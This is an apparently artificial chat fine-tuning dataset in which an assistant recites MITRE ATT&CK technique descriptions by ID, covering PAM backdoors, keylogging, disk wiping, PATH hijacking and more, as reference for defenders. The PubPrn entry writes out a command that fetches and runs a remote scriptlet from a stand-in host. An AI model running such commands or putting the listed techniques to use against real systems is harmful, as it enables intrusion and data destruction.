{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Plist Modification' and with the Id: T1150 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Plist Modification' and with the Id: T1150 is described as follows: Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pluggable Authentication Modules' and with the Id: T1556.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pluggable Authentication Modules' and with the Id: T1556.003 is described as follows: Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Revert Cloud Instance' and with the Id: T1578.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Revert Cloud Instance' and with the Id: T1578.004 is described as follows: An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'HISTCONTROL' and with the Id: T1148 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'HISTCONTROL' and with the Id: T1148 is described as follows: The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Gather Victim Host Information' and with the Id: T1592 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Gather Victim Host Information' and with the Id: T1592 is described as follows: Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Digital Certificates' and with the Id: T1596.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Digital Certificates' and with the Id: T1596.003 is described as follows: Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Keylogging' and with the Id: T1056.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Keylogging' and with the Id: T1056.001 is described as follows: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.* Reading raw keystroke data from the hardware buffer.* Windows Registry modifications.* Custom drivers.* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) . The systems targeted by this attack pattern are: Windows, macOS, Linux, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File/Path Exclusions' and with the Id: T1564.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File/Path Exclusions' and with the Id: T1564.012 is described as follows: Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Linux and Mac File and Directory Permissions Modification' and with the Id: T1222.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Linux and Mac File and Directory Permissions Modification' and with the Id: T1222.002 is described as follows: Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) . The systems targeted by this attack pattern are: macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Guessing' and with the Id: T1110.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Guessing' and with the Id: T1110.001 is described as follows: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)* SNMP (161/UDP and 162/TCP/UDP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'PubPrn' and with the Id: T1216.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'PubPrn' and with the Id: T1216.001 is described as follows: Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Purchase Technical Data' and with the Id: T1597.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Purchase Technical Data' and with the Id: T1597.002 is described as follows: Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'OS Credential Dumping' and with the Id: T1003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'OS Credential Dumping' and with the Id: T1003 is described as follows: Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.. The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Shared Modules' and with the Id: T1129 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Shared Modules' and with the Id: T1129 is described as follows: Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Configuration Repository' and with the Id: T1602 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Configuration Repository' and with the Id: T1602 is described as follows: Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disk Structure Wipe' and with the Id: T1561.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disk Structure Wipe' and with the Id: T1561.002 is described as follows: Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Direct Network Flood' and with the Id: T1498.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Direct Network Flood' and with the Id: T1498.001 is described as follows: Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Stored Data Manipulation' and with the Id: T1492 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Stored Data Manipulation' and with the Id: T1492 is described as follows: Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Path Interception by PATH Environment Variable' and with the Id: T1574.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Path Interception by PATH Environment Variable' and with the Id: T1574.007 is described as follows: Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Sharepoint' and with the Id: T1213.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Sharepoint' and with the Id: T1213.002 is described as follows: Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials* Work / project schedules* Source code snippets* Links to network shares and other internal resources. The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Direct Volume Access' and with the Id: T1006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Direct Volume Access' and with the Id: T1006 is described as follows: Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl). The systems targeted by this attack pattern are: Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File System Permissions Weakness' and with the Id: T1044 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File System Permissions Weakness' and with the Id: T1044 is described as follows: Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.### ServicesManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.### Executable InstallersAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Artificial Intelligence' and with the Id: T1588.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Artificial Intelligence' and with the Id: T1588.007 is described as follows: Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI)For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Hiding Rules' and with the Id: T1564.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Hiding Rules' and with the Id: T1564.008 is described as follows: Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).. The systems targeted by this attack pattern are: Windows, Office 365, Linux, macOS, Google Workspace ."}]}
